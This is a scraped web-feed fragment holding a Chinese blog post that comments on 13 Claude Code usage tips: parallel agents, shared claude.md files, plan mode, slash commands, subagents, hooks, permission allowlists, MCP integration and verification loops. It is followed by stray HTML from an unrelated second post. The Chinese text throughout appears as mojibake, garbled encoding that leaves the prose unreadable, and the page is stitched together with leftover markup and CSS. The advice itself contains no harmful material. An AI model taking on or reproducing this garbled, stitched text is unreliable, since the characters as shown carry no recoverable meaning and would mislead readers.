.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å…ƒæ—¦å‡æœŸåˆšè¿‡å°±çœ‹åˆ°äº† <code>Claude Code</code> ä½œè€…å‘å¸ƒçš„ 13 æ¡æŠ€å·§ï¼Œä½†æ˜¯æœ€è¿‘å®åœ¨å¤ªå¿™ï¼Œæ²¡æ¥å¾—åŠä»”ç»†å­¦ä¹ ã€‚</p>
<p>æ˜¨å¤©å’Œæœ‹å‹èŠåˆ°è¿™ä¸ªï¼Œæ‰å†æ¬¡æƒ³èµ·ã€‚</p>
<p>ç”±äºæœ€è¿‘ä¸€æ®µæ—¶é—´ <code>Claude Code</code> çš„ä½¿ç”¨æ²¡æœ‰åƒ <code>TRAE</code> å’Œ <code>Cursor</code> é‚£ä¹ˆå¤šï¼Œä»Šå¤©å°±ç»“åˆæˆ‘çš„ç»éªŒï¼Œå’Œå¤§å®¶èŠèŠæˆ‘å¯¹è¿™ 13 æ¡æŠ€å·§çš„çš„ç†è§£å’Œå®è·µã€‚</p>
<h2 data-id="heading-0">ç»ˆç«¯å¤šå¼€å¹¶è¡Œ</h2>
<p><strong>åŸæ–‡æ€è·¯</strong></p>
<p>åœ¨ç»ˆç«¯å¹¶è¡Œè¿è¡Œ 5 ä¸ª Claude å®ä¾‹ï¼Œä¸ºæ¯ä¸ªæ ‡ç­¾é¡µç¼–å·ï¼ˆ1-5ï¼‰ï¼Œåˆ©ç”¨ç³»ç»Ÿé€šçŸ¥åŠŸèƒ½æé†’éœ€è¦äººå·¥è¾“å…¥çš„ä»»åŠ¡ï¼Œæé«˜å¤šä»»åŠ¡å¤„ç†æ•ˆç‡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c15fe645a5b7411bb7d96e46b4c6b298~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768438936&amp;x-signature=Oya%2B85NmafcCHUCBn1CNlPqoREQ%3D" alt="" loading="lazy"/></p>
<p><strong>ç†è§£/å®è·µ</strong></p>
<p>ç°åœ¨å„ä¸ª <code>AI IDE</code> å‡ ä¹éƒ½æ”¯æŒäº†å¤š <code>Agent</code> å¹¶è¡Œçš„ç‰¹æ€§ï¼Œè¿™ä¸ªç‰¹æ€§å¯¹æ•ˆç‡çš„æå‡å¹¶ä¸æ˜¯<code>30%</code>ã€<code>40%</code>è¿™æ ·å¢åŠ çš„ï¼Œè€Œæ˜¯éšç€ <code>Agent</code> çš„å¯åŠ¨æˆå€å¢åŠ ï¼Œè¿™åº”è¯¥ä¹Ÿæ˜¯è‡ªåŠ¨åŒ–çš„æ ¹æœ¬æ„ä¹‰ï¼ˆæˆ‘è®¤ä¸º AI æœ¬èº«å°±æ˜¯ä¸€ç§é«˜çº§çš„è‡ªåŠ¨åŒ–ï¼‰ã€‚</p>
<p>åœ¨è¿˜æ²¡æœ‰è¯¥ç‰¹æ€§çš„æ—¶å€™ï¼Œæˆ‘å’Œå¾ˆå¤šä¼™ä¼´éƒ½æ˜¯é€šè¿‡ <strong>IDE å¤šå¼€</strong>ã€<strong>å¤š IDE åˆ‡æ¢</strong>å®ç°å¹¶è¡Œå¼€å‘çš„æ•ˆæœï¼Œä¸è¿‡ï¼Œç»ˆç©¶ä¸å¦‚ç°åœ¨è¿™æ ·é«˜æ•ˆã€‚</p>
<h2 data-id="heading-1">å¤šç«¯æ— ç¼è”åŠ¨</h2>
<p><strong>åŸæ–‡æ€è·¯</strong></p>
<p>ç»“åˆç½‘é¡µç«¯ï¼ˆ5-10ä¸ªä¼šè¯ï¼‰ä¸ç§»åŠ¨ç«¯ï¼ˆå¦‚iOSåº”ç”¨ï¼‰å¹¶è¡Œåä½œï¼Œä½¿ç”¨<code>--teleport</code>å‘½ä»¤åœ¨ä¸åŒè®¾å¤‡é—´åŒæ­¥ä¼šè¯è¿›åº¦ï¼Œå®ç°è·¨å¹³å°æ— ç¼è¡”æ¥ã€‚</p>
<p><strong>ç†è§£/å®è·µ</strong></p>
<p>é’ˆå¯¹å¯ä»¥è¿è¡Œé•¿ä»»åŠ¡çš„æ¨¡å‹ï¼Œå¤šç«¯åˆ‡æ¢ç¡®å®éå¸¸æœ‰æ•ˆã€‚</p>
<p>ä½ å¯ä»¥åœ¨å¤–å‡ºã€ä¼‘æ¯çš„æ—¶å€™æŒæ§å¼€å‘ä»»åŠ¡çš„è¿›åº¦ï¼Œæˆ–è€…è¿›è¡Œæ–°çš„å¼€å‘ä»»åŠ¡çš„å¯åŠ¨ã€‚</p>
<p>ç”±äº <code>AI IDE</code> çš„ç•Œé¢ç‰¹æ€§ï¼Œä¸€ç›´æ²¡æœ‰å®è·µè¿‡ï¼Œåç»­å¯ä»¥å°è¯•é€šè¿‡ <strong>VS æ’ä»¶</strong>ç»“åˆ <strong>APP</strong> çš„æ¨¡å¼è¯•è¯•ã€‚</p>
<h2 data-id="heading-2">ä¼˜é€‰æ€è€ƒæ¨¡å‹</h2>
<p><strong>åŸæ–‡æ€è·¯</strong></p>
<p>ä½¿ç”¨å¸¦æœ‰â€œæ€è€ƒè¿‡ç¨‹ï¼ˆthinkingï¼‰â€çš„ <code>Opus 4.5</code> æ¨¡å‹ï¼Œå°½ç®¡é€Ÿåº¦è¾ƒæ…¢ï¼Œä½†æ›´æ™ºèƒ½ã€æ›´æ“…é•¿è°ƒç”¨å·¥å…·ï¼Œèƒ½å‡å°‘äººå·¥å¼•å¯¼ï¼Œæé«˜æ‰§è¡Œæ•ˆç‡ã€‚</p>
<p><strong>ç†è§£/å®è·µ</strong></p>
<p>è¿™ä¸ªè¯´å®è¯ï¼Œä¸ªäººæœ€è¿‘å·²ç»å¾ˆå°‘æ³¨æ„äº†ï¼Œæ¯•ç«Ÿç°åœ¨çš„å‡ ä¸ªä¸»æµ <code>Coding</code> æ¨¡å‹åº”è¯¥éƒ½æ˜¯â€œæ€è€ƒâ€æ¨¡å‹ã€‚</p>
<h2 data-id="heading-3">å›¢é˜Ÿå…±ç”¨è§„èŒƒ</h2>
<p><strong>åŸæ–‡æ€è·¯</strong></p>
<p>ç»´æŠ¤ä¸€ä¸ªå›¢é˜Ÿå…±äº«çš„ <code>claude.md</code> æ–‡ä»¶ï¼Œè®°å½•é¡¹ç›®è§„èŒƒã€ç¼–ç ä¹ æƒ¯å’Œ <code>Claude</code> çš„é”™è¯¯æ¡ˆä¾‹ï¼Œå®šæœŸæ›´æ–°å¹¶æäº¤åˆ° <code>Git</code> ä»“åº“ï¼Œé¿å…é‡å¤çŠ¯é”™ã€‚</p>
<p><strong>ç†è§£/å®è·µ</strong></p>
<p>è¿™ä¸€ç‚¹éå¸¸æœ‰ç”¨ï¼Œä¸ä»…é™äºç»Ÿä¸€å›¢é˜Ÿä»£ç ç”Ÿæˆçš„è§„èŒƒã€‚æ›´æ˜¯å¯ä»¥é€šè¿‡å¤§å®¶çš„å†™ä½œï¼Œæ›´å¿«ã€æ›´å…¨é¢åœ°æ•´ç†å‡ºä¸€å¥—å®Œå–„çš„ <code>claude.md</code>ã€‚</p>
<p><code>Cursor</code> æ˜¯ç›´æ¥æ”¯æŒè¯†åˆ« <code>claude.md</code>ï¼Œå›½å†…çš„å…¶å®ƒ IDE ä¼°è®¡ä¹Ÿå¾ˆå¿«ä¼šæ”¯æŒï¼Œæ¯•ç«Ÿ <code>claude.md</code> å‡ ä¹å·²ç»å¿«è¦æˆä¸ºä¸€ä¸ªé»˜è®¤çš„æ ‡å‡†äº†ã€‚</p>
<h2 data-id="heading-4">å®¡æŸ¥å³åˆ»æ›´æ–°</h2>
<p><strong>åŸæ–‡æ€è·¯</strong></p>
<p>åœ¨ä»£ç å®¡æŸ¥ï¼ˆPRï¼‰è¿‡ç¨‹ä¸­ï¼Œé€šè¿‡ <code>@.claude</code> æŒ‡ä»¤å°†æ–°å‘ç°çš„è§„åˆ™æˆ–è§„èŒƒè‡ªåŠ¨æ·»åŠ åˆ° <code>claude.md</code>ï¼Œåˆ©ç”¨ <code>Claude Code</code> çš„ <code>GitHub Action</code> å®ç°è‡ªåŠ¨åŒ–æ›´æ–°ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/741a2da512cc428381061dfb0eacd58b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768438936&amp;x-signature=k1%2FK5o3ddrg4lcFQ%2BiqBTDUBZc0%3D" alt="" loading="lazy"/></p>
<p><strong>ç†è§£/å®è·µ</strong></p>
<p>å›½å¤–ä»–ä»¬æ™®éæ¥å— <code>Github</code> æ–¹å¼å¼€å‘ï¼Œæ‰€ä»¥ï¼Œ<code>Claude Code</code> æœ‰å¼€å‘ä¸“é—¨çš„ <code>Github</code> åº”ç”¨ï¼Œå¯ä»¥ç›´æ¥åœ¨ <code>Issue</code> å’Œ <code>PR</code> é˜¶æ®µè°ƒç”¨ <code>Claude</code>ã€‚</p>
<p>ä½†æ®æˆ‘äº†è§£ï¼Œå›½å†…ç›®å‰æ²¡æœ‰ç°æˆçš„æ–¹æ¡ˆã€‚</p>
<p><code>Claude Code</code> å’Œç§æœ‰ä»“åº“ï¼Œè¿˜å¯ä»¥å€ŸåŠ© <code>Git Hook</code> å’Œ <code>Claude Agent SDK</code> è‡ªè¡Œå¼€å‘ï¼Œ<code>AI IDE</code> çš„è¯ï¼Œç¡®å®æ¯”è¾ƒéº»çƒ¦ã€‚</p>
<h2 data-id="heading-5">å…ˆè°‹è€ŒååŠ¨</h2>
<p><strong>åŸæ–‡æ€è·¯</strong></p>
<p>ä»»åŠ¡å¼€å§‹å‰å…ˆå¯ç”¨â€œè®¡åˆ’æ¨¡å¼ï¼ˆ<code>Plan Mode</code>ï¼‰â€ï¼ˆåŒå‡» <code>Shift+Tab</code>ï¼‰ï¼Œä¸ <code>Claude</code> æ²Ÿé€šç¡®è®¤æ–¹æ¡ˆï¼Œæ»¡æ„åå†åˆ‡æ¢åˆ°â€œè‡ªåŠ¨æ¥å—ä¿®æ”¹æ¨¡å¼â€æ‰§è¡Œï¼Œé™ä½è¯•é”™æˆæœ¬ã€‚</p>
<p><strong>ç†è§£/å®è·µ</strong></p>
<p>è¿™ä¸ªä¹‹å‰èŠè¿‡å¾ˆå¤šæ¬¡ï¼Œç”šè‡³åœ¨æ²¡æœ‰ <code>Plan</code> æ¨¡å¼æ—¶ï¼Œæˆ‘å°±åœ¨åˆ†äº«å‚è€ƒâ€œ<strong>è´¹æ›¼å­¦ä¹ æ³•</strong>â€è®© AI å…ˆå¤è¿°ä¸€éä¼šå¤§å¤§æå‡å›ç­”è´¨é‡ã€‚</p>
<p>å…¶å®æœ¬è´¨éƒ½æ˜¯è®© AI å’Œä½ çš„æ€ç»´<strong>å¯¹é½</strong>ï¼Œå› ä¸ºåŒæ ·çš„æ–‡å­—å¯èƒ½åœ¨ä½ å’Œ AI çš„ç†è§£ä¸­æ˜¯ä¸ä¸€æ ·çš„ï¼Œåªæœ‰ AI å†æ¬¡è¿”å›ä¸€è‡´ï¼Œæ‰è¯æ˜ä½ ä»¬ç†è§£åŒæ­¥äº†ã€‚</p>
<p>ç°åœ¨ <code>Cursor/TRAE</code> ç­‰å„ç±» <code>AI IDE</code> éƒ½æ”¯æŒäº† <code>Plan</code> æ¨¡å¼ï¼Œå¤§å®¶ç›´æ¥ä½¿ç”¨å³å¯ã€‚</p>
<p>ä¸‹é¢ 3 ä¸ªæŠ€å·§ï¼ˆ<strong>é«˜é¢‘æ“ä½œæŒ‡ä»¤åŒ–ã€éƒ¨ç½²ä¸“ç”¨å­æ™ºèƒ½ä½“ã€è‡ªåŠ¨æ ¼å¼åŒ–</strong>ï¼‰åœ¨æˆ‘çš„ç†è§£ä¸­ï¼Œåº”è¯¥æ˜¯åŒæ ·çš„ç›®çš„ï¼Œéƒ½æ˜¯è‡ªåŠ¨åŒ–æé«˜æ•ˆç‡ï¼Œä¸ç®¡æ˜¯<strong>æŒ‡ä»¤</strong>æ–¹å¼ã€<strong>å­æ™ºèƒ½ä½“</strong>æ–¹å¼ï¼Œè¿˜æ˜¯<strong>é’©å­</strong>æ–¹å¼ã€‚</p>
<h2 data-id="heading-6">é«˜é¢‘æ“ä½œæŒ‡ä»¤åŒ–</h2>
<p><strong>åŸæ–‡æ€è·¯</strong></p>
<p>å°†æ¯å¤©é‡å¤çš„å†…å¾ªç¯å·¥ä½œæµï¼ˆå¦‚æäº¤ä»£ç ã€åˆå¹¶åˆ†æ”¯ç­‰ï¼‰å°è£…ä¸ºæ–œæ å‘½ä»¤ï¼ˆ<code>Slash Commands</code>ï¼‰ï¼Œå­˜æ”¾åœ¨<code>.claude/commands/</code>ç›®å½•å¹¶æäº¤åˆ°<code>Git</code>ï¼Œå‡å°‘é‡å¤è¾“å…¥ã€‚</p>
<p><strong>ç†è§£/å®è·µ</strong></p>
<p><code>Cursor</code> æ˜¯ç›´æ¥æ”¯æŒ <code>Claude</code> æŒ‡ä»¤çš„ï¼Œè®¾ç½®ä¸­å‹¾é€‰å³å¯ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/287f207c80204d03a20bf525e193808c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768438936&amp;x-signature=19hIr%2FxcFd%2FrvU6IqEBRHxDcT6w%3D" alt="" loading="lazy"/></p>
<p><code>TRAE</code> æš‚æ—¶å°šæœªæ”¯æŒè¯¥ç±»ç‰¹æ€§ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡åˆ›å»ºæ™ºèƒ½ä½“æ¨¡æ‹Ÿã€‚</p>
<h2 data-id="heading-7">éƒ¨ç½²ä¸“ç”¨å­æ™ºèƒ½ä½“</h2>
<p><strong>åŸæ–‡æ€è·¯</strong></p>
<p>ä½¿ç”¨ç‰¹å®šåŠŸèƒ½çš„å­æ™ºèƒ½ä½“ï¼ˆ<code>Subagents</code>ï¼‰ï¼Œå¦‚ <code>code-simplifier</code> ç®€åŒ–ä»£ç ã€<code>verify-app</code> è¿›è¡Œç«¯åˆ°ç«¯æµ‹è¯•ï¼Œè‡ªåŠ¨åŒ–å¸¸è§æµç¨‹ã€‚</p>
<p><strong>ç†è§£/å®è·µ</strong></p>
<p>ç°åœ¨ <code>AI IDE</code> å·²ç»æ™®éæ”¯æŒè‡ªå®šä¹‰æ™ºèƒ½ä½“äº†ã€‚</p>
<p>å°¤å…¶æ˜¯ <code>TRAE</code> çš„æ™ºèƒ½ä½“è¿˜æ”¯æŒ <code>Claude Code</code> ä¸»æ™ºèƒ½ä½“è‡ªåŠ¨è°ƒç”¨å­æ™ºèƒ½ä½“çš„ç‰¹æ€§ï¼ŒæŒºå¥½ç”¨çš„ã€‚</p>
<h2 data-id="heading-8">è‡ªåŠ¨æ ¼å¼åŒ–</h2>
<p><strong>åŸæ–‡æ€è·¯</strong></p>
<p>ä½¿ç”¨ <code>PostToolUse</code> é’©å­è‡ªåŠ¨ä¿®æ­£ <code>Claude</code> ç”Ÿæˆä»£ç çš„æ ¼å¼ç»†èŠ‚ï¼Œé¿å…åœ¨æŒç»­é›†æˆï¼ˆCIï¼‰ä¸­å› æ ¼å¼é—®é¢˜æŠ¥é”™ã€‚</p>
<p><strong>ç†è§£/å®è·µ</strong></p>
<p>æ ¼å¼ä¸è§„æ•´è™½ç„¶ä¸å½±å“ AI é˜…è¯»ï¼Œä½†ç°åœ¨çš„ AI å°šæœªè¾¾åˆ°ç”Ÿæˆè´¨é‡100%æ¥å—çš„ç¨‹åº¦ï¼Œå› æ­¤è‰¯å¥½çš„æ ¼å¼åŒ–è¿˜æ˜¯éå¸¸æœ‰åˆ©äºæˆ‘ä»¬ CR å’Œæ¥æ‰‹çš„ã€‚</p>
<p><code>AI IDE</code> éƒ½æ˜¯ <code>VS Code</code> ç³»çš„æ¶æ„ï¼Œå¯ä»¥å€ŸåŠ©å„ç±»è¯­è¨€çš„æ ¼å¼åŒ–æ’ä»¶è¿›è¡Œæ›¿ä»£å®ç°ã€‚</p>
<h2 data-id="heading-9">æƒé™ç²¾ç»†åŒ–ç®¡ç†</h2>
<p><strong>åŸæ–‡æ€è·¯</strong></p>
<p>é€šè¿‡<code>/permissions</code>å‘½ä»¤é¢„å…ˆæ‰¹å‡†å®‰å…¨çš„<code>Bash</code>å‘½ä»¤ç™½åå•ï¼Œé…ç½®ä¿å­˜åœ¨<code>.claude/settings.json</code>ä¸­ï¼Œå›¢é˜Ÿå…±äº«ï¼Œå¹³è¡¡å®‰å…¨ä¸æ“ä½œæµç•…åº¦ã€‚</p>
<p><strong>ç†è§£/å®è·µ</strong></p>
<p>æƒé™ç®¡ç†å¾ˆé‡è¦ï¼Œ<code>Cursor/TRAE</code> éƒ½æä¾›äº†è‡ªå®šä¹‰ <code>Auto Run</code> çš„åŠŸèƒ½ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3568ef34f5a44149632c632e1159484~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768438936&amp;x-signature=R1Lpm5gfce5hrQUej17DaMH%2BIeE%3D" alt="" loading="lazy"/></p>
<p>æ ¹æ®è‡ªå·±çš„æƒ…å†µï¼ŒæŠŠä¸€äº›å¸¸ç”¨ä½†ä¸å±é™©çš„å‘½ä»¤åŠ å…¥ç™½åå•ï¼Œå°†å¤§å¤§é™ä½ä½ è¢« AI é€šçŸ¥æ‰“æ–­çš„é¢‘ç‡ã€‚</p>
<p>ä¸‹é¢ 3 ä¸ªæŠ€å·§ï¼ˆ<strong>å…¨å·¥å…·é“¾é›†æˆ</strong>ã€<strong>é•¿ä»»åŠ¡æ— äººå€¼å®ˆ</strong>ã€<strong>æ„å»ºéªŒè¯é—­ç¯</strong>ï¼‰æˆ‘æ„Ÿè§‰åˆæ˜¯ä¸€ç»„çš„ï¼Œå¹¶ä¸”è¿˜æ˜¯å±‚å±‚é€’è¿›çš„ã€‚</p>
<h2 data-id="heading-10">å…¨å·¥å…·é“¾é›†æˆ</h2>
<p><strong>åŸæ–‡æ€è·¯</strong></p>
<p>é€šè¿‡<code>MCP</code>æœåŠ¡å™¨é›†æˆ <code>Slack</code>ã€<code>BigQuery</code>ã€<code>Sentry</code> ç­‰å¤–éƒ¨å·¥å…·ï¼Œè®© <code>Claude</code> èƒ½è·¨å¹³å°æ“ä½œï¼ˆå¦‚æœç´¢ <code>Slack</code> æ¶ˆæ¯ã€è¿è¡Œ <code>BigQuery</code> æŸ¥è¯¢ã€æŠ“å–é”™è¯¯æ—¥å¿—ï¼‰ã€‚</p>
<p><strong>ç†è§£/å®è·µ</strong></p>
<p>å·¥å…·é“¾æ‰“é€šè‚¯å®šæ˜¯å¤§å®¶æ‰€æœŸæœ›çš„ï¼Œè°éƒ½ä¸å–œæ¬¢åœ¨ä¸€ä¸ªå·¥å…·ä¸­å¹²çš„å¥½å¥½æ—¶ï¼Œéœ€è¦ <code>Alt+Tab</code> åˆ‡æ¢å·¥å…·ã€‚</p>
<p>è€Œè¿™ä¹Ÿæ˜¯åé¢ 2 ä¸ªæŠ€å·§çš„åŸºç¡€ï¼šå·¥å…·é›†æˆçš„è¶Šå¤šï¼ŒAI ä»»åŠ¡è¢«ä¸­æ–­çš„å¯èƒ½å°±ä¼šè¶Šå°‘ã€‚</p>
<p>æœ€è¿‘å‡ å¹´ï¼Œå›½å†…è¶Šæ¥è¶Šå¤šçš„ç”Ÿæ€æä¾›äº† API æ¥å£ï¼Œå†åŠ ä¸Šä»Šå¹´çš„ MCPï¼Œè¶Šæ¥è¶Šå¤šçš„å·¥å…·å·²ç»å¯ä»¥è¢« AI æ¥å…¥ã€‚</p>
<h2 data-id="heading-11">é•¿ä»»åŠ¡æ— äººå€¼å®ˆ</h2>
<p><strong>åŸæ–‡æ€è·¯</strong></p>
<p>å¯¹äºé•¿æ—¶é—´è¿è¡Œçš„ä»»åŠ¡ï¼Œé‡‡ç”¨åå°éªŒè¯ã€<code>stop</code>é’©å­æˆ– <code>Ralph-Wiggum</code> æ’ä»¶è¿›è¡Œè‡ªåŠ¨åŒ–éªŒè¯ï¼Œé…åˆæ²™ç®±æ¨¡å¼æˆ– <code>--permission-mode=dontask</code> é¿å…æƒé™ä¸­æ–­ã€‚</p>
<p><strong>ç†è§£/å®è·µ</strong></p>
<p>è¿™ä¸€ç‚¹ä¹Ÿæ˜¯æˆ‘ä»¬å›¢é˜Ÿç›®å‰ä¸€ç›´åœ¨åŠªåŠ›çš„æ–¹å‘ï¼š</p>
<p>é€šè¿‡å„ç§å·¥ç¨‹åŒ–æ‰‹æ®µï¼Œé€æ­¥æå‡ <code>AI Coding</code> ä»»åŠ¡çš„é•¿åº¦å’Œå¤æ‚åº¦ï¼Œå¸®æˆ‘ä»¬èŠ‚çœå‡ºæ›´åŠ å¤§å—çš„æ—¶é—´ï¼Œå¯ä»¥åšæ›´å¤šå…¶ä»–çš„äº‹æƒ…ã€‚</p>
<p>æ­¤å¤„ <code>AI Coding</code> ä»»åŠ¡å¹¶ä¸æ˜¯ä¸€æ¬¡ AI å¯¹è¯ï¼Œè€Œæ˜¯é€šè¿‡ <code>Agent</code> æ¶æ„è‡ªè¡Œå®ç°ç›®æ ‡åˆ†è§£ã€å·¥å…·è°ƒç”¨ã€å¤šè½® AI è¯·æ±‚çš„ä¸€ä¸ªå®Œæ•´ç›®æ ‡å®Œæˆè¿‡ç¨‹ã€‚</p>
<h2 data-id="heading-12">æ„å»ºéªŒè¯é—­ç¯</h2>
<p><strong>åŸæ–‡æ€è·¯</strong></p>
<p>ä¸º<code>Claude</code>æä¾›æ˜ç¡®çš„éªŒè¯æ–¹æ³•ï¼ˆå¦‚è¿è¡Œæµ‹è¯•è„šæœ¬ã€æ‰“å¼€æµè§ˆå™¨æµ‹è¯•UIï¼‰ï¼Œé€šè¿‡åé¦ˆé—­ç¯æå‡æœ€ç»ˆç»“æœè´¨é‡ï¼Œè¿™æ˜¯æé«˜äº§å‡ºè´¨é‡çš„å…³é”®æŠ€å·§ã€‚</p>
<p><strong>ç†è§£/å®è·µ</strong></p>
<p>å¦‚æœè¯´â€œé•¿ä»»åŠ¡æ— äººå€¼å®ˆâ€æ˜¯ <code>AI Coding</code> çš„æœŸæœ›ç›®æ ‡çš„è¯ï¼Œâ€œæ„ä»¶éªŒè¯é—­ç¯â€å°±æ˜¯å®ç°è¿™ä¸ªç›®æ ‡çš„ä¿è¯ã€‚</p>
<p>æ¯•ç«Ÿï¼Œé•¿ä»»åŠ¡æ‰§è¡Œåï¼Œç»“æœä¸å¥½ï¼Œé‚£ä¸€åˆ‡éƒ½å…è°ˆã€‚</p>
<p>å› æ­¤ï¼Œå»ºç«‹ä¸€ä¸ªè‰¯å¥½çš„éªŒè¯æ–¹æ³•ï¼Œå¯ä»¥å¤§å¤§é™ä½ä»»åŠ¡è¿”å·¥çš„å‡ ç‡ã€‚</p>
<hr/>
<p>è¿™ 13 æ¡æŠ€å·§æ•´ä½“ä¸Šè¿˜æ˜¯éå¸¸æ˜æ™°ä¸”æœ‰æ•ˆçš„ï¼Œå¤§å®¶å¯ä»¥ç»“åˆè‡ªå·±çš„æƒ…å†µè¿›è¡Œå°è¯•ã€‚</p>
<p>å¦‚æœä½ å¯¹è¿™ 13 æ¡æŠ€å·§æœ‰ä»€ä¹ˆä¸åŒçš„ç†è§£æˆ–ç–‘é—®ï¼Œæ¬¢è¿ç•™è¨€è®¨è®ºï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[# å¤§å‚AIå…¨æ˜¯é»‘è¯ï¼ŸOoderé SkillæŠ€æœ¯3å¤©è½åœ°ä¼ä¸šçº§åº”ç”¨ï¼Œè¿™æ‰æ˜¯çœŸå®ç”¨ï¼]]></title>    <link>https://juejin.cn/post/7592439090096685099</link>    <guid>https://juejin.cn/post/7592439090096685099</guid>    <pubDate>2026-01-07T23:04:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592439090096685099" data-draft-id="7592410399917555753" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="# å¤§å‚AIå…¨æ˜¯é»‘è¯ï¼ŸOoderé SkillæŠ€æœ¯3å¤©è½åœ°ä¼ä¸šçº§åº”ç”¨ï¼Œè¿™æ‰æ˜¯çœŸå®ç”¨ï¼"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-07T23:04:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="OneCodeCN"/> <meta itemprop="url" content="https://juejin.cn/user/1427583415622366"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            # å¤§å‚AIå…¨æ˜¯é»‘è¯ï¼ŸOoderé SkillæŠ€æœ¯3å¤©è½åœ°ä¼ä¸šçº§åº”ç”¨ï¼Œè¿™æ‰æ˜¯çœŸå®ç”¨ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1427583415622366/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    OneCodeCN
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T23:04:01.000Z" title="Wed Jan 07 2026 23:04:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body 